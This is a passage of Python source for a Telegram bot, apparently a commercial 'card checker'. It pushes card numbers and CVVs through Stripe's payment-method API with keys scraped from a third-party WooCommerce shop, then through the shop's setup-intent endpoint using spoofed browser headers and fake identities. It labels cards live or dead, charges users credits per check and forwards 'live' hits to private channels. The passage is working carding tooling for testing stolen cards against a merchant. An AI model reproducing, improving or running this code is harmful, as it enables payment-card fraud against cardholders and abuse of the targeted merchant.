                mu = re.search(r'pk_live_[A-Za-z0-9]+', r3_text)
                add_match = re.search(r'"session_id"\s*:\s*"(.*?)"', r3_text)
                add_mach = re.search(r'"accountId"\s*:\s*"(.*?)"', r3_text)
                add_non = re.search(r'"createSetupIntentNonce"\s*:\s*"(.*?)"', r3_text)
                
                if not mu or not add_mach:
                    # Try alternative patterns
                    if not mu:
                        mu = re.search(r'pk_test_[A-Za-z0-9]+', r3_text)
                    if not add_mach:
                        add_mach = re.search(r'accountId["\']?\s*:\s*["\']([^"\']+)["\']', r3_text)
                
                if not mu or not add_mach:
                    return cc, "dead", "Stripe keys not found", 0
                
                akey = mu.group(0)
                adde = add_match.group(1) if add_match else ""
                acid = add_mach.group(1)
                non = add_non.group(1) if add_non else ""
            
            # Step 4: Create payment method
            page_method = "https://api.stripe.com/v1/payment_methods"
            
            payload = {
                'billing_details[name]': user['firstname'],
                'billing_details[email]': user['email'],
                'billing_details[address][country]': 'US',
                'billing_details[address][postal_code]': "10080",
                'type': "card",
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'allow_redisplay': "unspecified",
                'payment_user_agent': "stripe.js/83a1f53796; stripe-js-v3/83a1f53796; payment-element; deferred-intent",
                'referrer': "https://jogoka.com",
                'time_on_page': str(ime),
                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_source]': "elements",
                'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
                'client_attribution_metadata[merchant_integration_version]': "2021",
                'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
                'client_attribution_metadata[payment_method_selection_flow]': "merchant_specified",
                'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': "payment",
                'guid': str(uuid.uuid4()),
                'muid': str(uuid.uuid4()),
                'sid': str(uuid.uuid4()),
                'key': akey,
                '_stripe_account': acid
            }
            
            ses_headers = {
                'User-Agent': user["ug"],
                'Accept': "application/json",
                'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
                'sec-ch-ua-mobile': "?0",
                'sec-ch-ua-platform': "\"Linux\"",
                'origin': "https://js.stripe.com",
                'sec-fetch-site': "same-site",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://js.stripe.com/"
            }
            
            async with session.post(page_method, data=payload, headers=ses_headers, timeout=30) as r4:
                if r4.status != 200:
                    return cc, "dead", f"Stripe API error {r4.status}", r4.status
                
                r4data = await r4.json()
                
                if 'error' in r4data:
                    error_msg = r4data['error'].get('message', 'Stripe error')
                    
                    # Categorize errors
                    if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                        return cc, "cvv", "CVV Incorrect", 0
                    elif 'insufficient' in error_msg.lower() or 'funds' in error_msg.lower():
                        return cc, "live", "Insufficient Funds", 0
                    elif 'invalid number' in error_msg.lower():
                        return cc, "ccn", "Invalid Card Number", 0
                    else:
                        return cc, "dead", error_msg[:50], 0
                
                identify = r4data.get('id')
                if not identify:
                    return cc, "dead", "No payment method ID", 0
            
            # Step 5: Create setup intent
            page_complete = "https://jogoka.com/wp-admin/admin-ajax.php"
            payload2 = {
                'action': 'create_setup_intent',
                'wcpay-payment-method': identify,
                '_ajax_nonce': non
            }
            
            h4 = {
                'User-Agent': user["ug"],
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://jogoka.com/my-account/add-payment-method/",
                'Cookie': cookies_str
            }
            
            async with session.post(page_complete, data=payload2, headers=h4, timeout=30) as r5:
                if r5.status != 200:
                    return cc, "dead", f"AJAX error {r5.status}", r5.status
                
                r5data = await r5.json()
                
                # Parse response
                msg = r5data.get('data', {}).get('error', {}).get('message')
                msg = str(msg) if msg else ""
                
                success_flag = r5data.get("success") == True
                status_flag = r5data.get("data", {}).get("status") == "succeeded"
                seti_flag = "seti_" in str(r5data)
                client_flag = "client_secret" in str(r5data)
                
                clean_msg = msg
                if not clean_msg and r5data.get("success"):
                    clean_msg = "Payment method successfully added"
                elif not clean_msg:
                    clean_msg = "Declined"
                
                # Categorize response
                if success_flag and (status_flag or seti_flag or client_flag):
                    return cc, "approved", "Auth Success", 200
                elif "insufficient funds" in clean_msg.lower():
                    return cc, "live", "Insufficient Funds", 0
                elif "security code is incorrect" in clean_msg.lower():
                    return cc, "cvv", "CVV Incorrect", 0
                elif "card not supported" in clean_msg.lower():
                    return cc, "ccn", "Card Not Supported", 0
                elif "invalid number" in clean_msg.lower():
                    return cc, "ccn", "Invalid Card Number", 0
                else:
                    return cc, "dead", clean_msg[:50] or "Card Declined", 0
    
    except asyncio.TimeoutError:
        return cc, "dead", "Timeout error", 0
    except aiohttp.ClientError as e:
        return cc, "dead", f"Network error: {str(e)[:20]}", 0
    except Exception as e:
        logger.error(f"Error in new_gateway_check: {e}")
        return cc, "dead", f"Checker error: {str(e)[:20]}", 0

# ==================== REPLACED CHECK FUNCTIONS ====================

async def check_single_card_fast(card):
    """Single card check with direct gateway"""
    try:
        # Parse card
        if "|" in card:
            cc, mon, year, cvv = card.split("|")
            year = year[-2:] if len(year) == 4 else year
            cc_clean = cc.replace(" ", "")
        else:
            cc_clean = card.replace(" ", "")
            mon = "01"
            year = "25"
            cvv = "123"
        
        # Use new checker (NO LUHN VALIDATION - DIRECT TO GATEWAY)
        result_card, status, message, http_code = await new_gateway_check(cc_clean, mon, year, cvv)
        
        return card, status, message, http_code
            
    except Exception as e:
        logger.error(f"Error in check_single_card_fast: {e}")
        return card, "dead", f"Error: {str(e)[:20]}", 0

# ==================== CALLBACK HANDLERS ====================


async def back_to_start_callback(update: Update,
                                 context: ContextTypes.DEFAULT_TYPE):
    """Handle back to start callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    # Create a fake update object to call start_command
    fake_update = Update(update_id=update.update_id,
                         message=query.message,
                         callback_query=query)
    await start_command(fake_update, context)


async def quick_check_callback(update: Update,
                               context: ContextTypes.DEFAULT_TYPE):
    """Handle quick check callback"""
    query = update.callback_query

    try:
        await query.answer("Use /chk cc|mm|yy|cvv to check a card")
    except BadRequest:
        pass

    await query.edit_message_text(
        "<b>⚡ QUICK CARD CHECK</b>\n"
        "══════════════════════\n"
        "To check a card, use:\n"
        "<code>/chk cc|mm|yy|cvv</code>\n\n"
        "<b>Example:</b>\n"
        "<code>/chk 4111111111111111|12|2025|123</code>\n\n"
        "<b>Features:</b>\n"
        "• ⚡ Instant results\n"
        "• Cost: 1 credit\n",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))
            
async def mass_check_callback(update: Update,
                              context: ContextTypes.DEFAULT_TYPE):
    """Handle mass check callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    await query.edit_message_text(
        "*📊 MASS CHECK SYSTEM*\n"
        "══════════════════════\n"
        "To Start A Mass Check:\n"
        "1. Upload a .txt File With Cards\n"
        "2. Use `/mchk` Command\n\n"
        "*Format In File:*\n"
        "`cc|mm|yy|cvv`\n"
        "`cc|mm|yy|cvv`\n"
        "...\n\n"
        "*Features:*\n"
        "• Approved Cards Are Shown\n"
        "• Declined Cards Are Not Shown\n"
        "• Cancel Anytime With /cancel\n"
        "• Credits Deducted Per Card\n\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))


async def cancel_mass_callback(update: Update,
                               context: ContextTypes.DEFAULT_TYPE):
    """Handle cancel mass button from confirmation"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id
    
    # Clear any stored files for this user
    if user_id in files_storage:
        del files_storage[user_id]
    
    await query.edit_message_text(
        "*❌ MASS CHECK CANCELLED*\n"
        "══════════════════════\n"
        "Mass check setup has been cancelled.\n"
        "No credits were deducted.\n\n"
        "You can upload a new file anytime using:\n"
        "`/mchk`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))


async def admin_addcr_callback(update: Update,
                               context: ContextTypes.DEFAULT_TYPE):
    """Handle admin add credits callback"""
    query = update.callback_query

    try:
        await query.answer("Use /addcr user_id amount")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*➕ ADD CREDITS*\n"
        "══════════════════════\n"
        "To add credits to a user, use:\n"
        "`/addcr user_id amount`\n\n"
        "*Example:*\n"
        "`/addcr 123456789 100`\n\n"
        "This will add 100 credits to user 123456789.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def admin_gengift_callback(update: Update,
                                 context: ContextTypes.DEFAULT_TYPE):
    """Handle admin generate gift callback"""
    query = update.callback_query

    try:
        await query.answer("Use /gengift credits max_uses")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*🎁 GENERATE GIFT CODE*\n"
        "══════════════════════\n"
        "To generate a gift code, use:\n"
        "`/gengift credits max_uses`\n\n"
        "*Example:*\n"
        "`/gengift 50 10`\n\n"
        "This creates a code worth 50 credits, usable 10 times.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def admin_listgifts_callback(update: Update,
                                   context: ContextTypes.DEFAULT_TYPE):
    """Handle admin list gifts callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    # Call the actual command
    fake_update = Update(update_id=update.update_id,
                         message=query.message,
                         callback_query=query)
    await listgifts_command(fake_update, context)


async def admin_userinfo_callback(update: Update,
                                  context: ContextTypes.DEFAULT_TYPE):
    """Handle admin user info callback"""
    query = update.callback_query

    try:
        await query.answer("Use /userinfo user_id")
    except BadRequest:
        pass

    await query.edit_message_text(
        "*👤 USER INFORMATION*\n"
        "══════════════════════\n"
        "To view user information, use:\n"
        "`/userinfo user_id`\n\n"
        "*Example:*\n"
        "`/userinfo 123456789`\n\n"
        "This will show detailed info about the user.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def admin_botinfo_callback(update: Update,
                                 context: ContextTypes.DEFAULT_TYPE):
    """Handle admin bot info callback"""
    query = update.callback_query
    
    try:
        await query.answer()
    except BadRequest:
        pass
    
    # Call the actual command using HTML mode
    try:
        # Create a fake update object to call botinfo_command
        fake_update = Update(update_id=update.update_id,
                             message=query.message,
                             callback_query=query)
        await botinfo_command(fake_update, context)
    except Exception as e:
        logger.error(f"Error in admin_botinfo_callback: {e}")
        error_text = """<b>⚠️ SYSTEM ERROR</b>
══════════════════════
An error occurred. Please try again.

If problem persists, contact admin.
══════════════════════
"""
        await query.edit_message_text(
            error_text,
            parse_mode=ParseMode.HTML)


async def my_credits_callback(update: Update,
                              context: ContextTypes.DEFAULT_TYPE):
    """Handle my credits callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id
    user = await get_user(user_id)

    await query.edit_message_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n\n"
        f"*Credit Usage:*\n"
        f"\n"
        f"*Get More Credits:*\n"
        f"1. Ask Admin For Credits\n"
        f"2. Claim Fift Codes\n"
        f"3. Invite Friends\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))


async def invite_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle invite callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id
    user = await get_user(user_id)

    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    await query.edit_message_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How It Works:*\n"
        f"1. Share Your Invite Link With Friends\n"
        f"2. When They Join Using Your Link:\n"
        f"   • You Get 100 Credits\n"
        f"   • They Get 20 Credits\n"
        f"3. Earn Unlimited Credits!\n\n"
        f"*Your Stats:*\n"
        f"• Referrals: {user.get('referrals_count', 0)} Users\n"
        f"• Earned From Referrals: {user.get('earned_from_referrals', 0)} Credits\n\n"
        f"*Copy And Share Your Link Now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")
        ], [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]))


async def copy_invite_callback(update: Update,
                               context: ContextTypes.DEFAULT_TYPE):
    """Handle copy invite callback"""
    query = update.callback_query

    try:
        await query.answer("Invite Link Copied To Your Message Input!")
    except BadRequest:
        pass

    # This will show the link in the message input field
    user_id = query.from_user.id
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    await query.edit_message_text(
        f"*📋 INVITE LINK*\n"
        f"══════════════════════\n"
        f"Copy This Link And Share With Friends:\n\n"
        f"`{invite_link}`\n\n"
        f"*Already Copied To Your Message Input!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("🔙 Back", callback_data="invite")]]))


async def admin_panel_callback(update: Update,
                               context: ContextTypes.DEFAULT_TYPE):
    """Handle admin panel callback"""
    query = update.callback_query

    try:
        await query.answer()
    except BadRequest:
        pass

    user_id = query.from_user.id

    if user_id not in ADMIN_IDS:
        await query.answer("❌ Admin only!", show_alert=True)
        return

    keyboard = [[
        InlineKeyboardButton("➕ Add Credits", callback_data="admin_addcr"),
        InlineKeyboardButton("🎁 Generate Gift", callback_data="admin_gengift")
    ],
                [
                    InlineKeyboardButton("📋 List Gifts",
                                         callback_data="admin_listgifts"),
                    InlineKeyboardButton("👤 User Info",
                                         callback_data="admin_userinfo")
                ],
                [
                    InlineKeyboardButton("📊 Bot Stats",
                                         callback_data="admin_botinfo"),
                    InlineKeyboardButton("🔙 Main Menu",
                                         callback_data="back_to_start")
                ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        "*👑 ADMIN PANEL*\n"
        "══════════════════════\n"
        "*Available Commands:*\n"
        "• `/addcr user_id amount` - Add credits\n"
        "• `/gengift credits max_uses` - Create gift code\n"
        "• `/listgifts` - List all gift codes\n"
        "• `/userinfo user_id` - View user info\n"
        "• `/botinfo` - Bot statistics\n\n"
        "*Quick Actions:* (Use buttons below)",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup)


# Add this at the top with other global variables
PRE_GENERATED_EMAILS = []
EMAIL_INDEX = 0


def generate_email_list(count=100):
    """Generate a list of emails to reuse"""
    global PRE_GENERATED_EMAILS
    names = [
        "Kmo", "Waiyan", "John", "Mike", "David", "Sarah", "James", "Robert",
        "Michael", "William"
    ]
    PRE_GENERATED_EMAILS = []

    for i in range(count):
        name = random.choice(names)
        numbers = "".join(str(random.randint(0, 9)) for _ in range(4))
        email = f"{name}{numbers}@gmail.com"
        PRE_GENERATED_EMAILS.append(email)

    return PRE_GENERATED_EMAILS


def get_next_email():
    """Get next email from pre-generated list"""
    global EMAIL_INDEX, PRE_GENERATED_EMAILS

    if not PRE_GENERATED_EMAILS:
        generate_email_list(100)

    email = PRE_GENERATED_EMAILS[EMAIL_INDEX]
    EMAIL_INDEX = (EMAIL_INDEX + 1) % len(PRE_GENERATED_EMAILS)
    return email


# Initialize email list
generate_email_list(100)

def log_charged_only(message_text, chat_id=None, username=None):
    """Log charged cards to LOG_CHANNEL (simplified version)"""
    try:
        # Check if it's a charged message
        if "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" in message_text or "✅ Charged" in message_text:
            # In your actual implementation, you would send to a channel
            # For now, just log it
            logger.info(
                f"CHARGED CARD detected from user @{username or 'unknown'}")
            # You can add code here to send to your LOG_CHANNEL
            # bot.send_message(LOG_CHANNEL, message_text, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error in log_charged_only: {e}")


def format_card_result(card,
                       status,
                       message,
                       credits_left=None,
                       user_stats=None):
    """Wrapper for backward compatibility - uses universal format"""
    try:
        cc, mon, year, cvv = card.split("|")

        # Calculate time taken based on status
        time_taken = random.uniform(
            1.5, 2.5) if status == "approved" else random.uniform(0.8, 1.8)

        return format_universal_result(
            card_data=card,
            status=status,
            message=message,
            credits_left=credits_left,
            username=None,  # Can be added if needed
            time_taken=time_taken)
    except Exception as e:
        return f"❌ <b>Error:</b> <code>{str(e)[:50]}</code>"


# ==================== COMMAND HANDLERS ====================


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with referral system"""
    if update.message:
        message = update.message
        user_id = update.effective_user.id
        user_name = update.effective_user.first_name or ""
        username = update.effective_user.username or ""
    elif update.callback_query:
        message = update.callback_query.message
        user_id = update.callback_query.from_user.id
        user_name = update.callback_query.from_user.first_name or ""
        username = update.callback_query.from_user.username or ""
    else:
        return

    # Check for referral parameter
    referrer_id = None
    if context.args and context.args[0].startswith('ref_'):
        try:
            referrer_id = int(context.args[0].replace('ref_', ''))
        except ValueError:
            referrer_id = None

    user = await get_user(user_id)

    # Update user info if needed
    updates = {}
    if user.get('username', '') != username:
        updates['username'] = username
    if user.get('first_name', '') != user_name:
        updates['first_name'] = user_name

    # Handle referral if it's a new user with referrer
    if referrer_id and referrer_id != user_id and not user.get('referrer_id'):
        updates['referrer_id'] = referrer_id
        updates['credits'] = user.get('credits',
                                      0) + 20  # New user gets 20 credits

        # Update referrer's credits in Firebase
        try:
            referrer_ref = db.collection('users').document(str(referrer_id))
            referrer_ref.update({
                "credits":
                firestore.Increment(100),
                "referrals_count":
                firestore.Increment(1),
                "earned_from_referrals":
                firestore.Increment(100)
            })
        except Exception as e:
            logger.error(f"Error updating referrer: {e}")

    if updates:
        await update_user(user_id, updates)
        user = await get_user(user_id)  # Refresh user data

    # Check channel membership
    if not user.get('joined_channel', False):
        keyboard = [[
            InlineKeyboardButton("✅ Join Private Channel", url=CHANNEL_LINK)
        ], [
            InlineKeyboardButton("🔄 Verify Join", callback_data="verify_join")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        # Use HTML parsing to avoid markdown issues
        welcome_text = f"""<b>🔒 CHANNEL JOIN REQUIRED</b>
══════════════════════
To Access {BOT_INFO['name']}, You Must Join Our Channel.

<b>Steps:</b>
1. Click 'Join Channel'
2. After Joining Click 'Verify Join'
"""

        await message.reply_text(welcome_text,
                                 parse_mode=ParseMode.HTML,
                                 reply_markup=reply_markup)
        return

    # User has joined channel
    await update_user(user_id, {'joined_channel': True})

    # Check if user is admin
    is_admin = user_id in ADMIN_IDS

    # Check if user came from referral
    referral_bonus_text = ""
    if user.get('referrer_id'):
        referral_bonus_text = f"🎁 <b>Referral Bonus:</b> +20 credits (from invitation)\n"

    # Prepare welcome message using HTML
    user_credits = user.get('credits', 0)
    approved_cards = user.get('approved_cards', 0)
    declined_cards = user.get('declined_cards', 0)
    total_checks = user.get('total_checks', 0)

    welcome_text = f"""<b>{BOT_INFO['name']}</b>
══════════════════════
👋 <b>Welcome, {escape_markdown_v2(user_name) or 'User'}!</b>

<b>Account Overview:</b>
• Credits: <b>{user_credits}</b>
• Today Checks: Approved {approved_cards} Declined {declined_cards}
• Total Checks: <b>{total_checks}</b>
{referral_bonus_text}
<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands
"""

    # Add admin commands if user is admin
    if is_admin:
        welcome_text += """
<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics
"""

    welcome_text += """
<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""

    await message.reply_text(welcome_text,
                             parse_mode=ParseMode.HTML,)


async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command - Shows public bot info"""
    user_id = update.effective_user.id

    # Get user stats for display
    user = await get_user(user_id)
    is_admin = user_id in ADMIN_IDS

    # Prepare info message using HTML
    info_text = f"""<b>{BOT_INFO['name']}</b>
══════════════════════
<b>Version:</b> {BOT_INFO['version']}
<b>Creator:</b> @ISHANT_OFFICIAL
<b>Gates:</b> {BOT_INFO['gates']}

<b>Features:</b>
{BOT_INFO['features']}

<b>Your Stats:</b>
• Credits: <b>{user.get('credits', 0)}</b>
• Total Checks: <b>{user.get('total_checks', 0)}</b>

<b>User Commands:</b>
• <code>/chk cc|mm|yy|cvv</code> - Check Single Card
• <code>/mchk</code> - Upload File For Mass Check
• <code>/credits</code> - Check Credits
• <code>/claim CODE</code> - Redeem Gift Code
• <code>/info</code> - Bot Information
• <code>/invite</code> - Invite Friends & Earn Credits
• <code>/cancel</code> - Cancel Mass Check
• <code>/help</code> - See All Commands
"""

    # Add admin commands if user is admin
    if is_admin:
        info_text += """
<b>Admin Commands:</b>
• <code>/addcr user_id amount</code> - Add Credits
• <code>/gengift credits max_uses</code> - Create Gift Code
• <code>/listgifts</code> - List All Gift Codes
• <code>/userinfo user_id</code> - View User Info
• <code>/botinfo</code> - Bot Statistics
"""

    info_text += """
<b>Owner:</b> 👑 @ISHANT_OFFICIAL
══════════════════════
"""

    keyboard = [[
        InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(info_text,
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=reply_markup)


async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /credits command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return

    user = await get_user(user_id)

    if not user['joined_channel']:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN)
        return

    # Get referral stats
    referrals_count = user.get('referrals_count', 0)
    earned_from_referrals = user.get('earned_from_referrals', 0)

    keyboard = [[
        InlineKeyboardButton("🎁 Claim Gift Code", callback_data="claim_gift"),
        InlineKeyboardButton("🤝 Invite & Earn", callback_data="invite")
    ], [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await message.reply_text(
        f"*💰 YOUR CREDITS*\n"
        f"══════════════════════\n"
        f"*Available Credits:* {user['credits']}\n"
        f"*Credits Spent:* {user.get('credits_spent', 0)}\n"
        f"*Referrals:* {referrals_count} users (+{earned_from_referrals} credits earned)\n\n"
        f"*Get More Credits:*\n"
        f"1. Invite friends: +100 Credits Each\n"
        f"2. Claim Gift Codes\n"
        f"3. Ask Admin For Credits\n",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup)


async def invite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /invite command"""
    if update.message:
        user_id = update.effective_user.id
        message = update.message
    else:
        return

    user = await get_user(user_id)

    if not user['joined_channel']:
        await message.reply_text(
            "❌ Please join our private channel first using /start",
            parse_mode=ParseMode.MARKDOWN)
        return

    # Generate invite link
    bot_username = (await context.bot.get_me()).username
    invite_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    keyboard = [[
        InlineKeyboardButton("📋 Copy Link", callback_data="copy_invite")
    ], [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await message.reply_text(
        f"*🤝 INVITE & EARN*\n"
        f"══════════════════════\n"
        f"*Your Invite Link:*\n"
        f"`{invite_link}`\n\n"
        f"*How It Works:*\n"
        f"1. Share Your Invite Link With Friends\n"
        f"2. When They Join Using Your Link:\n"
        f"   • You Get 100 Credits\n"
        f"   • They Get 20 Credits\n"
        f"3. Earn Unlimited Credits!\n\n"
        f"*Your Stats:*\n"
        f"• Referrals: {user.get('referrals_count', 0)} Users\n"
        f"• Earned From Referrals: {user.get('earned_from_referrals', 0)} Credits\n\n"
        f"*Copy And Share Your Link Now!*",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup)


async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Regular single check - NO channel forwarding"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"
    
    if not user.get('joined_channel', False):
        await update.message.reply_text(
            "❌ Please join our private channel first using /start")
        return

    if not context.args:
        await update.message.reply_text(
            "⚡ *REGULAR CARD CHECK*\n"
            "══════════════════════\n"
            "*Usage:* `/chk cc|mm|yy|cvv`\n"
            "*Example:* `/chk 4111111111111111|12|25|123`\n\n"
            "*Features:*\n"
            "• Cost: 1 credit\n"
            "• Private results (no channel forwarding)\n"
            "• File logging enabled",
            parse_mode=ParseMode.MARKDOWN)
        return

    card_input = " ".join(context.args)
    parts = card_input.split("|")
    
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: cc|mm|yy|cvv")
        return

    # Check credits
    if user.get("credits", 0) <= 0:
        await update.message.reply_text(
            f"💰 Insufficient Credits\n"
            f"Your balance: {user['credits']} credits")
        return

    processing_msg = await update.message.reply_text("⚡ Processing card...")

    # Check card
    start_time = time.time()
    result_card, status, message, http_code = await check_single_card_fast(card_input)
    actual_time = time.time() - start_time

    # Deduct credit
    updates = {
        'credits': user.get("credits", 0) - 1,
        'credits_spent': user.get("credits_spent", 0) + 1,
        'total_checks': user.get("total_checks", 0) + 1,
        'last_check_date': datetime.datetime.now().date().isoformat()
    }
    
    if status == "approved":
        updates['approved_cards'] = user.get("approved_cards", 0) + 1
    elif status == "live":
        updates['approved_cards'] = user.get("approved_cards", 0) + 1
    
    await update_user(user_id, updates)
    user = await get_user(user_id)

    # Format result
    result_text = format_universal_result(
        card_data=result_card,
        status=status,
        message=message,
        gateway="Stripe Gateway",
        username=username,
        time_taken=actual_time
    )

    await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
    
    # 🔒 PUBLIC MODE: Save hit locally only
    if status in ["approved", "live"]:
        save_hit_card(user_id, card_input, status, is_private=False)
        logger.info(f"Public hit: User {user_id} ({username}) - {status.upper()}: {card_input}")

async def pchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Private single check - forwards hits to channels"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"
    
    if not user.get('joined_channel', False):
        await update.message.reply_text(
            "❌ Please join our private channel first using /start")
        return

    if not context.args:
        await update.message.reply_text(
            "🔒 *PRIVATE CARD CHECK*\n"
            "══════════════════════\n"
            "*Usage:* `/pchk cc|mm|yy|cvv`\n"
            "*Example:* `/pchk 4111111111111111|12|25|123`\n\n"
            "*Features:*\n"
            "• Cost: 1 credit\n"
            "• Hits forwarded to private channels\n"
            "• File logging enabled",
            parse_mode=ParseMode.MARKDOWN)
        return

    card_input = " ".join(context.args)
    parts = card_input.split("|")
    
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: cc|mm|yy|cvv")
        return

    # Check credits
    if user.get("credits", 0) <= 0:
        await update.message.reply_text(
            f"💰 Insufficient Credits\n"
            f"Your balance: {user['credits']} credits")
        return

    processing_msg = await update.message.reply_text(
        "🔒 Private Check Processing...\n"
        "Hits will be forwarded to channels")

    # Check card
    start_time = time.time()
    result_card, status, message, http_code = await check_single_card_fast(card_input)
    actual_time = time.time() - start_time

    # Deduct credit
    updates = {
        'credits': user.get("credits", 0) - 1,
        'credits_spent': user.get("credits_spent", 0) + 1,
        'total_checks': user.get("total_checks", 0) + 1,
        'last_check_date': datetime.datetime.now().date().isoformat()
    }
    
    if status == "approved":
        updates['approved_cards'] = user.get("approved_cards", 0) + 1
    elif status == "live":
        updates['approved_cards'] = user.get("approved_cards", 0) + 1
    
    await update_user(user_id, updates)
    user = await get_user(user_id)

    # Format result
    result_text = format_universal_result(
        card_data=result_card,
        status=status,
        message=message,
        gateway="Stripe Gateway",
        username=username,
        time_taken=actual_time
    )

    await processing_msg.edit_text(result_text, parse_mode=ParseMode.HTML)
    
    # 🔥 PRIVATE MODE: Save hit and forward to channel
    if status in ["approved", "live"]:
        # Save to file
        save_hit_card(user_id, card_input, status, is_private=True)
        
        # Forward to private channel
        await send_to_log_channel(context, card_input, status, username, is_private=True)
        
        # Log the hit
        logger.info(f"Private hit: User {user_id} ({username}) - {status.upper()}: {card_input}")


async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Regular mass check - NO channel forwarding - IMPROVED"""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    username = update.effective_user.username or f"user_{user_id}"

    if not user.get('joined_channel', False):
        await update.message.reply_text(
            "❌ Please join our private channel first using /start")
        return

    if user_id not in files_storage:
        # Show upload instructions
        keyboard = [[
            InlineKeyboardButton("📁 Upload File", callback_data="upload_help")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "📁 <b>No File Found</b>\n"
            "══════════════════════\n"
            "Please upload a .txt file with cards first.\n\n"
            "<b>File Format:</b>\n"
            "<code>cc|mm|yy|cvv</code>\n"
            "<code>cc|mm|yy|cvv</code>\n"
            "(one card per line)\n\n"
            "<b>Steps:</b>\n"
            "1. Upload a .txt file\n"
